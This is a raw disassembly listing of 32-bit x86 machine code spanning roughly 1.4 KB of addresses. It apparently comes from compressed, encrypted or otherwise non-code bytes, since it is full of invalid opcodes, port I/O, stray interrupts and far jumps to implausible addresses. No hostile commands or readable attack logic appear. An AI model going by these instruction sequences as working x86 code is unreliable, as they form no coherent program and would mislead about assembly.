  4036e5:	87 4a e9             	xchg   %ecx,-0x17(%edx)
  4036e8:	49                   	dec    %ecx
  4036e9:	5e                   	pop    %esi
  4036ea:	43                   	inc    %ebx
  4036eb:	ee                   	out    %al,(%dx)
  4036ec:	f7 60 d9             	mull   -0x27(%eax)
  4036ef:	c3                   	ret
  4036f0:	bf a9 6f 15 e5       	mov    $0xe5156fa9,%edi
  4036f5:	31 0c 40             	xor    %ecx,(%eax,%eax,2)
  4036f8:	72 f8                	jb     0x4036f2
  4036fa:	d0 99 1a bd 9c 1f    	rcrb   $1,0x1f9cbd1a(%ecx)
  403700:	ec                   	in     (%dx),%al
  403701:	75 ed                	jne    0x4036f0
  403703:	9c                   	pushf
  403704:	5d                   	pop    %ebp
  403705:	d4 64                	aam    $0x64
  403707:	95                   	xchg   %eax,%ebp
  403708:	e6 2b                	out    %al,$0x2b
  40370a:	31 7f 3f             	xor    %edi,0x3f(%edi)
  40370d:	40                   	inc    %eax
  40370e:	46                   	inc    %esi
  40370f:	e3 7e                	jecxz  0x40378f
  403711:	21 56 bf             	and    %edx,-0x41(%esi)
  403714:	dc 49 0a             	fmull  0xa(%ecx)
  403717:	9b                   	fwait
  403718:	cd 09                	int    $0x9
  40371a:	3c 21                	cmp    $0x21,%al
  40371c:	62 96 4e f2 42 5c    	bound  %edx,0x5c42f24e(%esi)
  403722:	a9 02 02 5a 14       	test   $0x145a0202,%eax
  403727:	ff 16                	call   *(%esi)
  403729:	d7                   	xlat   %ds:(%ebx)
  40372a:	40                   	inc    %eax
  40372b:	49                   	dec    %ecx
  40372c:	18 1b                	sbb    %bl,(%ebx)
  40372e:	01 e8                	add    %ebp,%eax
  403730:	dc f5                	fdiv   %st,%st(5)
  403732:	8f 41 16             	pop    0x16(%ecx)
  403735:	f2 dc ed             	repnz fsubr %st,%st(5)
  403738:	1f                   	pop    %ds
  403739:	2c 7b                	sub    $0x7b,%al
  40373b:	0e                   	push   %cs
  40373c:	ee                   	out    %al,(%dx)
  40373d:	c0 a2 45 6a 68 fd e6 	shlb   $0xe6,-0x29795bb(%edx)
  403744:	12 39                	adc    (%ecx),%bh
  403746:	11 83 74 bf e8 a3    	adc    %eax,-0x5c17408c(%ebx)
  40374c:	fc                   	cld
  40374d:	68 29 fa 11 43       	push   $0x4311fa29
  403752:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403753:	e1 e7                	loope  0x40373c
  403755:	0c d8                	or     $0xd8,%al
  403757:	80 81 29 bd b0 09 5d 	addb   $0x5d,0x9b0bd29(%ecx)
  40375e:	17                   	pop    %ss
  40375f:	90                   	nop
  403760:	34 68                	xor    $0x68,%al
  403762:	88 49 4c             	mov    %cl,0x4c(%ecx)
  403765:	7d cb                	jge    0x403732
  403767:	18 1c 1a             	sbb    %bl,(%edx,%ebx,1)
  40376a:	77 7a                	ja     0x4037e6
  40376c:	93                   	xchg   %eax,%ebx
  40376d:	a9 8e 7f 21 bc       	test   $0xbc217f8e,%eax
  403772:	c5 31                	lds    (%ecx),%esi
  403774:	f7 46 21 9a 8b 1d 76 	testl  $0x761d8b9a,0x21(%esi)
  40377b:	09 73 7c             	or     %esi,0x7c(%ebx)
  40377e:	c2 ef 92             	ret    $0x92ef
  403781:	aa                   	stos   %al,%es:(%edi)
  403782:	67 3f                	addr16 aas
  403784:	57                   	push   %edi
  403785:	1e                   	push   %ds
  403786:	95                   	xchg   %eax,%ebp
  403787:	58                   	pop    %eax
  403788:	de 6c 8e ea          	fisubrs -0x16(%esi,%ecx,4)
  40378c:	97                   	xchg   %eax,%edi
  40378d:	e9 20 11 db 50       	jmp    0x511b48b2
  403792:	24 78                	and    $0x78,%al
  403794:	ce                   	into
  403795:	82 fc ae             	cmp    $0xae,%ah
  403798:	6c                   	insb   (%dx),%es:(%edi)
  403799:	1d 33 af b9 ea       	sbb    $0xeab9af33,%eax
  40379e:	ee                   	out    %al,(%dx)
  40379f:	8f 00                	pop    (%eax)
  4037a1:	8f                   	(bad)
  4037a2:	14 7b                	adc    $0x7b,%al
  4037a4:	91                   	xchg   %eax,%ecx
  4037a5:	f6 dd                	neg    %ch
  4037a7:	18 cc                	sbb    %cl,%ah
  4037a9:	ec                   	in     (%dx),%al
  4037aa:	ca b6 39             	lret   $0x39b6
  4037ad:	8e dd                	mov    %ebp,%ds
  4037af:	17                   	pop    %ss
  4037b0:	85 d7                	test   %edx,%edi
  4037b2:	1c f6                	sbb    $0xf6,%al
  4037b4:	44                   	inc    %esp
  4037b5:	9c                   	pushf
  4037b6:	8e 6d 06             	mov    0x6(%ebp),%gs
  4037b9:	80 08 3b             	orb    $0x3b,(%eax)
  4037bc:	49                   	dec    %ecx
  4037bd:	dd f9                	(bad)
  4037bf:	0b 77 18             	or     0x18(%edi),%esi
  4037c2:	36 96                	ss xchg %eax,%esi
  4037c4:	f0 94                	lock xchg %eax,%esp
  4037c6:	11 74 6d 75          	adc    %esi,0x75(%ebp,%ebp,2)
  4037ca:	e3 56                	jecxz  0x403822
  4037cc:	79 55                	jns    0x403823
  4037ce:	e6 d1                	out    %al,$0xd1
  4037d0:	49                   	dec    %ecx
  4037d1:	62 0e                	bound  %ecx,(%esi)
  4037d3:	e9 12 91 de ef       	jmp    0xf01ec8ea
  4037d8:	4a                   	dec    %edx
  4037d9:	45                   	inc    %ebp
  4037da:	48                   	dec    %eax
  4037db:	55                   	push   %ebp
  4037dc:	db 78 02             	fstpt  0x2(%eax)
  4037df:	23 9e 11 0c 04 1b    	and    0x1b040c11(%esi),%ebx
  4037e5:	51                   	push   %ecx
  4037e6:	c4 85 0d 8a 71 f1    	les    -0xe8e75f3(%ebp),%eax
  4037ec:	2f                   	das
  4037ed:	82 ba 38 34 66 cf f7 	cmpb   $0xf7,-0x3099cbc8(%edx)
  4037f4:	f9                   	stc
  4037f5:	1a 29                	sbb    (%ecx),%ch
  4037f7:	2f                   	das
  4037f8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4037f9:	16                   	push   %ss
  4037fa:	a2 b2 91 bf e9       	mov    %al,0xe9bf91b2
  4037ff:	49                   	dec    %ecx
  403800:	14 63                	adc    $0x63,%al
  403802:	b4 a7                	mov    $0xa7,%ah
  403804:	68 ce 2c d8 49       	push   $0x49d82cce
  403809:	58                   	pop    %eax
  40380a:	a9 d6 1e ab 8c       	test   $0x8cab1ed6,%eax
  40380f:	ef                   	out    %eax,(%dx)
  403810:	3a 84 d0 ba 5b 84 29 	cmp    0x29845bba(%eax,%edx,8),%al
  403817:	23 76 4e             	and    0x4e(%esi),%esi
  40381a:	75 07                	jne    0x403823
  40381c:	cf                   	iret
  40381d:	10 f4                	adc    %dh,%ah
  40381f:	16                   	push   %ss
  403820:	91                   	xchg   %eax,%ecx
  403821:	44                   	inc    %esp
  403822:	50                   	push   %eax
  403823:	8e bd 68 fc cb 14    	mov    0x14cbfc68(%ebp),%?
  403829:	6f                   	outsl  %ds:(%esi),(%dx)
  40382a:	9d                   	popf
  40382b:	6e                   	outsb  %ds:(%esi),(%dx)
  40382c:	ff                   	(bad)
  40382d:	be f5 a3 3b a2       	mov    $0xa23ba3f5,%esi
  403832:	db 5a 40             	fistpl 0x40(%edx)
  403835:	45                   	inc    %ebp
  403836:	96                   	xchg   %eax,%esi
  403837:	d5 19                	aad    $0x19
  403839:	5a                   	pop    %edx
  40383a:	00 d3                	add    %dl,%bl
  40383c:	a1 d6 f0 5d b4       	mov    0xb45df0d6,%eax
  403841:	38 66 99             	cmp    %ah,-0x67(%esi)
  403844:	11 28                	adc    %ebp,(%eax)
  403846:	9e                   	sahf
  403847:	d2 ca                	ror    %cl,%dl
  403849:	e8 63 c5 1b d3       	call   0xd35bfdb1
  40384e:	37                   	aaa
  40384f:	db 84 4b 75 8c c9 c4 	fildl  -0x3b36738b(%ebx,%ecx,2)
  403856:	10 6e df             	adc    %ch,-0x21(%esi)
  403859:	20 d0                	and    %dl,%al
  40385b:	10 6e 0d             	adc    %ch,0xd(%esi)
  40385e:	f2 21 f9             	repnz and %edi,%ecx
  403861:	be a4 ac bf 27       	mov    $0x27bfaca4,%esi
  403866:	81 8d 24 ea 4f b5 ed 	orl    $0xc27de0ed,-0x4ab015dc(%ebp)
  40386d:	e0 7d c2 
  403870:	4c                   	dec    %esp
  403871:	92                   	xchg   %eax,%edx
  403872:	ba 1c 58 9e 60       	mov    $0x609e581c,%edx
  403877:	d2 8f 20 47 a3 cb    	rorb   %cl,-0x345cb8e0(%edi)
  40387d:	99                   	cltd
  40387e:	59                   	pop    %ecx
  40387f:	ea 77 90 60 c5 3a 5d 	ljmp   $0x5d3a,$0xc5609077
  403886:	9e                   	sahf
  403887:	1c e2                	sbb    $0xe2,%al
  403889:	de 44 72 5d          	fiadds 0x5d(%edx,%esi,2)
  40388d:	28 a4 c0 ad 04 83 76 	sub    %ah,0x768304ad(%eax,%eax,8)
  403894:	1d 87 2f 67 e3       	sbb    $0xe3672f87,%eax
  403899:	c1 ad 08 62 7f 50 63 	shrl   $0x63,0x507f6208(%ebp)
  4038a0:	c4 6c 5d a7          	les    -0x59(%ebp,%ebx,2),%ebp
  4038a4:	41                   	inc    %ecx
  4038a5:	4a                   	dec    %edx
  4038a6:	84 3d d6 b2 d8 33    	test   %bh,0x33d8b2d6
  4038ac:	fb                   	sti
  4038ad:	61                   	popa
  4038ae:	b8 7f 0d c7 5f       	mov    $0x5fc70d7f,%eax
  4038b3:	65 c8 ad 21 68       	gs enter $0x21ad,$0x68
  4038b8:	75 fc                	jne    0x4038b6
  4038ba:	8f 89 cd 9b          	(bad)
  4038be:	6b a9 67 bb 66 59 36 	imul   $0x36,0x5966bb67(%ecx),%ebp
  4038c5:	88 af 3d 6a cd 66    	mov    %ch,0x66cd6a3d(%edi)
  4038cb:	e4 93                	in     $0x93,%al
  4038cd:	f1                   	int1
  4038ce:	c8 ae d8 e3          	enter  $0xd8ae,$0xe3
  4038d2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4038d3:	af                   	scas   %es:(%edi),%eax
  4038d4:	30 8d bb 8b 08 12    	xor    %cl,0x12088bbb(%ebp)
  4038da:	8d 53 c7             	lea    -0x39(%ebx),%edx
  4038dd:	1e                   	push   %ds
  4038de:	2d d4 1a e7 e1       	sub    $0xe1e71ad4,%eax
  4038e3:	94                   	xchg   %eax,%esp
  4038e4:	79 fe                	jns    0x4038e4
  4038e6:	cc                   	int3
  4038e7:	2a 67 59             	sub    0x59(%edi),%ah
  4038ea:	bc 4c c6 aa 15       	mov    $0x15aac64c,%esp
  4038ef:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4038f0:	5a                   	pop    %edx
  4038f1:	cd 56                	int    $0x56
  4038f3:	60                   	pusha
  4038f4:	f2 24 a9             	repnz and $0xa9,%al
  4038f7:	dd 02                	fldl   (%edx)
  4038f9:	79 f2                	jns    0x4038ed
  4038fb:	4e                   	dec    %esi
  4038fc:	cc                   	int3
  4038fd:	44                   	inc    %esp
  4038fe:	64 fb                	fs sti
  403900:	d5 8b                	aad    $0x8b
  403902:	dc dc                	(bad)
  403904:	0d 67 fd d7 96       	or     $0x96d7fd67,%eax
  403909:	9f                   	lahf
  40390a:	6a 01                	push   $0x1
  40390c:	0c 09                	or     $0x9,%al
  40390e:	f7 03 f8 e1 1e 88    	testl  $0x881ee1f8,(%ebx)
  403914:	76 1f                	jbe    0x403935
  403916:	64 80 ed 08          	fs sub $0x8,%ch
  40391a:	f8                   	clc
  40391b:	ea 41 85 eb 10 5e 03 	ljmp   $0x35e,$0x10eb8541
  403922:	5f                   	pop    %edi
  403923:	9a 5e 4b 8f 82 72 3e 	lcall  $0x3e72,$0x828f4b5e
  40392a:	f7 ff                	idiv   %edi
  40392c:	f5                   	cmc
  40392d:	83 28 d5             	subl   $0xffffffd5,(%eax)
  403930:	59                   	pop    %ecx
  403931:	97                   	xchg   %eax,%edi
  403932:	e7 14                	out    %eax,$0x14
  403934:	5e                   	pop    %esi
  403935:	fb                   	sti
  403936:	96                   	xchg   %eax,%esi
  403937:	24 b1                	and    $0xb1,%al
  403939:	23 b5 ca f4 30 27    	and    0x2730f4ca(%ebp),%esi
  40393f:	ba 36 22 53 5b       	mov    $0x5b532236,%edx
  403944:	0f                   	xrstors (bad)
  403945:	c7                   	(bad)
  403946:	df e9                	fucomip %st(1),%st
  403948:	45                   	inc    %ebp
  403949:	d7                   	xlat   %ds:(%ebx)
  40394a:	25 32 ba 8e 2d       	and    $0x2d8eba32,%eax
  40394f:	64 14 a9             	fs adc $0xa9,%al
  403952:	30 31                	xor    %dh,(%ecx)
  403954:	73 46                	jae    0x40399c
  403956:	be be 43 94 9e       	mov    $0x9e9443be,%esi
  40395b:	70 22                	jo     0x40397f
  40395d:	b1 08                	mov    $0x8,%cl
  40395f:	2b db                	sub    %ebx,%ebx
  403961:	85 f5                	test   %esi,%ebp
  403963:	b5 b8                	mov    $0xb8,%ch
  403965:	95                   	xchg   %eax,%ebp
  403966:	ee                   	out    %al,(%dx)
  403967:	06                   	push   %es
  403968:	97                   	xchg   %eax,%edi
  403969:	28 15 78 80 60 3f    	sub    %dl,0x3f608078
  40396f:	6a ba                	push   $0xffffffba
  403971:	f0 52                	lock push %edx
  403973:	9a 3c d7 f5 51 21 9a 	lcall  $0x9a21,$0x51f5d73c
  40397a:	6a 5a                	push   $0x5a
  40397c:	62 8f 2a 3f 5d f2    	bound  %ecx,-0xda2c0d6(%edi)
  403982:	a8 ac                	test   $0xac,%al
  403984:	3d c7 84 ae f5       	cmp    $0xf5ae84c7,%eax
  403989:	3e 01 1c dc          	add    %ebx,%ds:(%esp,%ebx,8)
  40398d:	1b 37                	sbb    (%edi),%esi
  40398f:	77 fd                	ja     0x40398e
  403991:	0c a0                	or     $0xa0,%al
  403993:	90                   	nop
  403994:	52                   	push   %edx
  403995:	b2 a0                	mov    $0xa0,%dl
  403997:	9d                   	popf
  403998:	de e2                	fsubp  %st,%st(2)
  40399a:	35 4a c8 02 1b       	xor    $0x1b02c84a,%eax
  40399f:	2d 09 c8 fe 84       	sub    $0x84fec809,%eax
  4039a4:	be 0a f0 f6 3d       	mov    $0x3df6f00a,%esi
  4039a9:	17                   	pop    %ss
  4039aa:	3e 1a a1 4b d8 5d 30 	sbb    %ds:0x305dd84b(%ecx),%ah
  4039b1:	0b 08                	or     (%eax),%ecx
  4039b3:	e3 23                	jecxz  0x4039d8
  4039b5:	f4                   	hlt
  4039b6:	4e                   	dec    %esi
  4039b7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4039b8:	e0 39                	loopne 0x4039f3
  4039ba:	cd 23                	int    $0x23
  4039bc:	7c 74                	jl     0x403a32
  4039be:	00 ab c8 17 84 fb    	add    %ch,-0x47be838(%ebx)
  4039c4:	3a df                	cmp    %bh,%bl
  4039c6:	6c                   	insb   (%dx),%es:(%edi)
  4039c7:	18 92 e2 ae ed e3    	sbb    %dl,-0x1c12511e(%edx)
  4039cd:	9e                   	sahf
  4039ce:	4b                   	dec    %ebx
  4039cf:	fb                   	sti
  4039d0:	06                   	push   %es
  4039d1:	9e                   	sahf
  4039d2:	cd 08                	int    $0x8
  4039d4:	55                   	push   %ebp
  4039d5:	2c 57                	sub    $0x57,%al
  4039d7:	be 0b 2d 5f db       	mov    $0xdb5f2d0b,%esi
  4039dc:	82 76 0c 16          	xorb   $0x16,0xc(%esi)
  4039e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039e1:	3a f9                	cmp    %cl,%bh
  4039e3:	52                   	push   %edx
  4039e4:	b1 a1                	mov    $0xa1,%cl
  4039e6:	3f                   	aas
  4039e7:	c3                   	ret
  4039e8:	39 03                	cmp    %eax,(%ebx)
  4039ea:	d2 b5 84 f0 94 df    	shlb   %cl,-0x206b0f7c(%ebp)
  4039f0:	77 6f                	ja     0x403a61
  4039f2:	46                   	inc    %esi
  4039f3:	2a a3 38 be 4b 72    	sub    0x724bbe38(%ebx),%ah
  4039f9:	1c 08                	sbb    $0x8,%al
  4039fb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4039fc:	47                   	inc    %edi
  4039fd:	f8                   	clc
  4039fe:	df 69 09             	fildll 0x9(%ecx)
  403a01:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a02:	7b dc                	jnp    0x4039e0
  403a04:	e6 6a                	out    %al,$0x6a
  403a06:	57                   	push   %edi
  403a07:	81 5f 7d e1 1f c6 c9 	sbbl   $0xc9c61fe1,0x7d(%edi)
  403a0e:	39 57 ec             	cmp    %edx,-0x14(%edi)
  403a11:	e2 78                	loop   0x403a8b
  403a13:	00 9b 55 2e 3c 16    	add    %bl,0x163c2e55(%ebx)
  403a19:	05 bd 3b 09 f4       	add    $0xf4093bbd,%eax
  403a1e:	7b 49                	jnp    0x403a69
  403a20:	a1 6a 65 68 f2       	mov    0xf268656a,%eax
  403a25:	32 5f d3             	xor    -0x2d(%edi),%bl
  403a28:	9d                   	popf
  403a29:	0a 84 35 46 b7 fc 0d 	or     0xdfcb746(%ebp,%esi,1),%al
  403a30:	fe                   	(bad)
  403a31:	28 a1 01 9a b7 50    	sub    %ah,0x50b79a01(%ecx)
  403a37:	54                   	push   %esp
  403a38:	2d c1 de d8 ff       	sub    $0xffd8dec1,%eax
  403a3d:	1d 4e 4c a9 44       	sbb    $0x44a94c4e,%eax
  403a42:	6a c6                	push   $0xffffffc6
  403a44:	62 83 07 86 ce fa    	bound  %eax,-0x53179f9(%ebx)
  403a4a:	0e                   	push   %cs
  403a4b:	65 b0 2d             	gs mov $0x2d,%al
  403a4e:	1d d9 f6 d8 2f       	sbb    $0x2fd8f6d9,%eax
  403a53:	f4                   	hlt
  403a54:	27                   	daa
  403a55:	09 e0                	or     %esp,%eax
  403a57:	1f                   	pop    %ds
  403a58:	5d                   	pop    %ebp
  403a59:	cc                   	int3
  403a5a:	10 31                	adc    %dh,(%ecx)
  403a5c:	35 3a a8 2d 6b       	xor    $0x6b2da83a,%eax
  403a61:	fd                   	std
  403a62:	21 76 40             	and    %esi,0x40(%esi)
  403a65:	f4                   	hlt
  403a66:	e2 4b                	loop   0x403ab3
  403a68:	99                   	cltd
  403a69:	36 ac                	lods   %ss:(%esi),%al
  403a6b:	0c 03                	or     $0x3,%al
  403a6d:	13 e1                	adc    %ecx,%esp
  403a6f:	4e                   	dec    %esi
  403a70:	d5 57                	aad    $0x57
  403a72:	ef                   	out    %eax,(%dx)
  403a73:	ef                   	out    %eax,(%dx)
  403a74:	2b c9                	sub    %ecx,%ecx
  403a76:	e9 d0 bb 6e dd       	jmp    0xddaef64b
  403a7b:	1a 5d 14             	sbb    0x14(%ebp),%bl
  403a7e:	8e 44 6a d2          	mov    -0x2e(%edx,%ebp,2),%es
  403a82:	ac                   	lods   %ds:(%esi),%al
  403a83:	51                   	push   %ecx
  403a84:	dd 77 73             	fnsave 0x73(%edi)
  403a87:	34 2a                	xor    $0x2a,%al
  403a89:	10 2d f1 99 db 02    	adc    %ch,0x2db99f1
  403a8f:	e3 6f                	jecxz  0x403b00
  403a91:	5e                   	pop    %esi
  403a92:	a2 1c 61 98 77       	mov    %al,0x7798611c
  403a97:	3f                   	aas
  403a98:	e1 d7                	loope  0x403a71
  403a9a:	04 c9                	add    $0xc9,%al
  403a9c:	3f                   	aas
  403a9d:	7d 02                	jge    0x403aa1
  403a9f:	81 be 80 12 55 a1 c7 	cmpl   $0xf09c39c7,-0x5eaaed80(%esi)
  403aa6:	39 9c f0 
  403aa9:	e6 e8                	out    %al,$0xe8
  403aab:	d1 8a d3 7d 16 52    	rorl   $1,0x52167dd3(%edx)
  403ab1:	10 fe                	adc    %bh,%dh
  403ab3:	40                   	inc    %eax
  403ab4:	2e f5                	cs cmc
  403ab6:	d7                   	xlat   %ds:(%ebx)
  403ab7:	1e                   	push   %ds
  403ab8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403ab9:	87 f5                	xchg   %esi,%ebp
  403abb:	84 a5 48 6d 98 4f    	test   %ah,0x4f986d48(%ebp)
  403ac1:	a9 b7 cc 0c bc       	test   $0xbc0cccb7,%eax
  403ac6:	b7 2d                	mov    $0x2d,%bh
  403ac8:	a1 c4 8d 34 04       	mov    0x4348dc4,%eax
  403acd:	b5 e5                	mov    $0xe5,%ch
  403acf:	21 67 83             	and    %esp,-0x7d(%edi)
  403ad2:	ac                   	lods   %ds:(%esi),%al
  403ad3:	07                   	pop    %es
  403ad4:	27                   	daa
  403ad5:	b6 fd                	mov    $0xfd,%dh
  403ad7:	e9 4e be 62 8b       	jmp    0x8ba2f92a
  403adc:	8a b3 79 51 b0 71    	mov    0x71b05179(%ebx),%dh
  403ae2:	f9                   	stc
  403ae3:	ff c5                	inc    %ebp
  403ae5:	cc                   	int3
  403ae6:	1e                   	push   %ds
  403ae7:	af                   	scas   %es:(%edi),%eax
  403ae8:	6c                   	insb   (%dx),%es:(%edi)
  403ae9:	fd                   	std
  403aea:	89 a3 2a c5 8a 4f    	mov    %esp,0x4f8ac52a(%ebx)
  403af0:	cf                   	iret
  403af1:	09 1a                	or     %ebx,(%edx)
  403af3:	fa                   	cli
  403af4:	ec                   	in     (%dx),%al
  403af5:	27                   	daa
  403af6:	ba 78 3b 3d c8       	mov    $0xc83d3b78,%edx
  403afb:	cc                   	int3
  403afc:	22 be 51 67 94 7c    	and    0x7c946751(%esi),%bh
  403b02:	22 b5 63 ee 0e c2    	and    -0x3df1119d(%ebp),%dh
  403b08:	e1 c0                	loope  0x403aca
  403b0a:	4f                   	dec    %edi
  403b0b:	b0 02                	mov    $0x2,%al
  403b0d:	65 65 2f             	gs gs das
  403b10:	c0 6c d9 ab 8e       	shrb   $0x8e,-0x55(%ecx,%ebx,8)
  403b15:	6a 1f                	push   $0x1f
  403b17:	74 5b                	je     0x403b74
  403b19:	4d                   	dec    %ebp
  403b1a:	6d                   	insl   (%dx),%es:(%edi)
  403b1b:	fd                   	std
  403b1c:	f8                   	clc
  403b1d:	b3 5a                	mov    $0x5a,%bl
  403b1f:	76 86                	jbe    0x403aa7
  403b21:	d9 a6 e4 3c 11 2f    	fldenv 0x2f113ce4(%esi)
  403b27:	7b 4a                	jnp    0x403b73
  403b29:	63 24 24             	arpl   %esp,(%esp)
  403b2c:	d8 a3 a8 96 f1 75    	fsubs  0x75f196a8(%ebx)
  403b32:	ec                   	in     (%dx),%al
  403b33:	28 33                	sub    %dh,(%ebx)
  403b35:	28 01                	sub    %al,(%ecx)
  403b37:	fb                   	sti
  403b38:	74 83                	je     0x403abd
  403b3a:	6d                   	insl   (%dx),%es:(%edi)
  403b3b:	77 dd                	ja     0x403b1a
  403b3d:	73 73                	jae    0x403bb2
  403b3f:	30 ca                	xor    %cl,%dl
  403b41:	d2 c1                	rol    %cl,%cl
  403b43:	63 d6                	arpl   %edx,%esi
  403b45:	04 ba                	add    $0xba,%al
  403b47:	9f                   	lahf
  403b48:	db 91 e7 b1 da 26    	fistl  0x26dab1e7(%ecx)
  403b4e:	c7                   	(bad)
  403b4f:	68 6c 13 86 9c       	push   $0x9c86136c
  403b54:	01 22                	add    %esp,(%edx)
  403b56:	aa                   	stos   %al,%es:(%edi)
  403b57:	41                   	inc    %ecx
  403b58:	2d 63 4f b1 aa       	sub    $0xaab14f63,%eax
  403b5d:	a8 96                	test   $0x96,%al
  403b5f:	3c 20                	cmp    $0x20,%al
  403b61:	4f                   	dec    %edi
  403b62:	ba e5 15 b6 22       	mov    $0x22b615e5,%edx
  403b67:	54                   	push   %esp
  403b68:	c7                   	(bad)
  403b69:	6b b9 3f cf ee 8d 34 	imul   $0x34,-0x721130c1(%ecx),%edi
  403b70:	53                   	push   %ebx
  403b71:	15 b7 bd 33 df       	adc    $0xdf33bdb7,%eax
  403b76:	01 4f ef             	add    %ecx,-0x11(%edi)
  403b79:	3b f8                	cmp    %eax,%edi
  403b7b:	de 1c 02             	ficomps (%edx,%eax,1)
  403b7e:	7b 77                	jnp    0x403bf7
  403b80:	d3 a1 59 10 9c 08    	shll   %cl,0x89c1059(%ecx)
  403b86:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403b87:	d1 43 74             	roll   $1,0x74(%ebx)
  403b8a:	a9 d1 06 bd 52       	test   $0x52bd06d1,%eax
  403b8f:	9e                   	sahf
  403b90:	1d b0 ad 15 9a       	sbb    $0x9a15adb0,%eax
  403b95:	58                   	pop    %eax
  403b96:	f7 7e 5f             	idivl  0x5f(%esi)
  403b99:	2e 76 51             	jbe,pn 0x403bed
  403b9c:	29 3f                	sub    %edi,(%edi)
  403b9e:	f4                   	hlt
  403b9f:	bb bb 55 bd 63       	mov    $0x63bd55bb,%ebx
  403ba4:	b8 da 2b 88 e4       	mov    $0xe4882bda,%eax
  403ba9:	95                   	xchg   %eax,%ebp
  403baa:	e6 b0                	out    %al,$0xb0
  403bac:	79 b2                	jns    0x403b60
  403bae:	9c                   	pushf
  403baf:	6a 9d                	push   $0xffffff9d
  403bb1:	f9                   	stc
  403bb2:	bf b4 1d 61 e2       	mov    $0xe2611db4,%edi
  403bb7:	41                   	inc    %ecx
  403bb8:	e7 fd                	out    %eax,$0xfd
  403bba:	0e                   	push   %cs
  403bbb:	d1 2f                	shrl   $1,(%edi)
  403bbd:	70 32                	jo     0x403bf1
  403bbf:	63 29                	arpl   %ebp,(%ecx)
  403bc1:	48                   	dec    %eax
  403bc2:	ef                   	out    %eax,(%dx)
  403bc3:	5a                   	pop    %edx
  403bc4:	29 e4                	sub    %esp,%esp
  403bc6:	36 95                	ss xchg %eax,%ebp
  403bc8:	9c                   	pushf
  403bc9:	f1                   	int1
  403bca:	a9 7c 10 e8 42       	test   $0x42e8107c,%eax
  403bcf:	73 80                	jae    0x403b51
  403bd1:	37                   	aaa
  403bd2:	30 94 ec ce f3 42 1c 	xor    %dl,0x1c42f3ce(%esp,%ebp,8)
  403bd9:	ae                   	scas   %es:(%edi),%al
  403bda:	a0 6c 7a 75 f5       	mov    0xf5757a6c,%al
  403bdf:	8c 8d ba 63 37 00    	mov    %cs,0x3763ba(%ebp)
  403be5:	ee                   	out    %al,(%dx)
  403be6:	6c                   	insb   (%dx),%es:(%edi)
  403be7:	b2 6f                	mov    $0x6f,%dl
  403be9:	62 ac b8 88 d4 2d 35 	bound  %ebp,0x352dd488(%eax,%edi,4)
  403bf0:	ea dc d7 3f ec d3 62 	ljmp   $0x62d3,$0xec3fd7dc
  403bf7:	b1 ac                	mov    $0xac,%cl
  403bf9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403bfa:	80 c7 0c             	add    $0xc,%bh
  403bfd:	d0 3d ab 89 6f d7    	sarb   $1,0xd76f89ab
  403c03:	0a c3                	or     %bl,%al
  403c05:	f3 20 41 95          	repz and %al,-0x6b(%ecx)
  403c09:	17                   	pop    %ss
  403c0a:	fd                   	std
  403c0b:	69 21 12 a4 26 53    	imul   $0x5326a412,(%ecx),%esp
  403c11:	94                   	xchg   %eax,%esp
  403c12:	de 0f                	fimuls (%edi)
  403c14:	1a 79 18             	sbb    0x18(%ecx),%bh
  403c17:	e6 3d                	out    %al,$0x3d
  403c19:	90                   	nop
  403c1a:	52                   	push   %edx
  403c1b:	20 4b 79             	and    %cl,0x79(%ebx)
  403c1e:	4f                   	dec    %edi
  403c1f:	4f                   	dec    %edi
  403c20:	ad                   	lods   %ds:(%esi),%eax
  403c21:	75 30                	jne    0x403c53
  403c23:	c5 c8 d9             	(bad)
  403c26:	55                   	push   %ebp
  403c27:	28 3d 20 48 5b 14    	sub    %bh,0x145b4820
  403c2d:	95                   	xchg   %eax,%ebp
  403c2e:	83 e2 9e             	and    $0xffffff9e,%edx
  403c31:	5b                   	pop    %ebx
  403c32:	5f                   	pop    %edi
  403c33:	64 f6 1e             	negb   %fs:(%esi)
  403c36:	72 a3                	jb     0x403bdb
  403c38:	44                   	inc    %esp
  403c39:	3f                   	aas
  403c3a:	b9 5d 1e 53 60       	mov    $0x60531e5d,%ecx
  403c3f:	c7                   	(bad)
  403c40:	af                   	scas   %es:(%edi),%eax
  403c41:	52                   	push   %edx
  403c42:	35 a3 e1 29 fd       	xor    $0xfd29e1a3,%eax
  403c47:	f9                   	stc
  403c48:	ac                   	lods   %ds:(%esi),%al
  403c49:	84 77 ab             	test   %dh,-0x55(%edi)
  403c4c:	d8 6c 9b 54          	fsubrs 0x54(%ebx,%ebx,4)
  403c50:	06                   	push   %es
  403c51:	ac                   	lods   %ds:(%esi),%al
  403c52:	bb 0b f2 5f d5       	mov    $0xd55ff20b,%ebx
  403c57:	ae                   	scas   %es:(%edi),%al
  403c58:	1e                   	push   %ds
  403c59:	e0 34                	loopne 0x403c8f
  403c5b:	e8 e8 90 e1 8d       	call   0x8e21cd48
  403c60:	21 ec                	and    %ebp,%esp
  403c62:	bf 34 8f e9 e6       	mov    $0xe6e98f34,%edi
  403c67:	82 1e f8             	sbbb   $0xf8,(%esi)
  403c6a:	55                   	push   %ebp
  403c6b:	62 2e                	bound  %ebp,(%esi)
  403c6d:	97                   	xchg   %eax,%edi
  403c6e:	4f                   	dec    %edi
  403c6f:	c0 f4 cb             	shl    $0xcb,%ah
  403c72:	0d 6a c3 5e f2       	or     $0xf25ec36a,%eax
  403c77:	97                   	xchg   %eax,%edi
  403c78:	42                   	inc    %edx
  403c79:	06                   	push   %es
  403c7a:	05 ea b8 67 a1       	add    $0xa167b8ea,%eax
  403c7f:	ff 70 7e             	push   0x7e(%eax)
  403c82:	9b                   	fwait
  403c83:	fc                   	cld
  403c84:	9a a7 a7 de bb d4 6c 	lcall  $0x6cd4,$0xbbdea7a7
  403c8b:	96                   	xchg   %eax,%esi
  403c8c:	b4 92                	mov    $0x92,%ah
  403c8e:	57                   	push   %edi
